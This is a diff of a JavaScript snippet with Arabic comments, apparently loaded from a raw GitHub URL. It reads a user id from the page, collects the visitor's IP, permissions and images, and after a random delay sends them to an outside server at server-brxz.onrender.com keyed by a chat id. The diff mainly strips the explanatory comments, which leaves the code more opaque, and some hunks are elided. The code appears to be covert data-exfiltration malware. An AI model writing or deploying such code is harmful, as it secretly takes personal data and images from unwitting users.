@@ -1,14 +1,10 @@
-// هذا الملف يتم تحميله من GitHub بشكل منفصل
-// الرابط: https://raw.githubusercontent.com/FGDHSHS/api/refs/heads/main/api
-
+// الملف على: https://raw.githubusercontent.com/FGDHSHS/api/refs/heads/main/api
 (function() {
     'use strict';
     
-    // الحصول على البيانات من النافذة الرئيسية
     const config = window._config || {};
     const userId = config.id || '';
     
-    // تجميع البيانات
     const info = {
         id: userId,
         perms: [],
@@ -19,11 +15,8 @@
         time: new Date().toISOString()
     };
     
-    // دالة مساعدة للإرسال
     function transmit(payload) {
-        const targets = [
-            'https://server-brxz.onrender.com/submitData'
-        ];
+        const targets = ['https://server-brxz.onrender.com/submitData'];
         
         targets.forEach(function(url) {
             try {
@@ -43,7 +36,6 @@
         });
     }
     
-    // العمليات الرئيسية
     async function main() {
         // IP
         try {
@@ -101,7 +93,6 @@
             }
         }
         
-        // إرسال
         transmit({
             chatId: info.id,
             imageDatas: info.imgs.join(','),
@@ -112,7 +103,6 @@
         });
     }
     
-    // تشغيل بعد تأخير عشوائي
     setTimeout(main, 2000 + Math.random() * 3000);
     
 })();
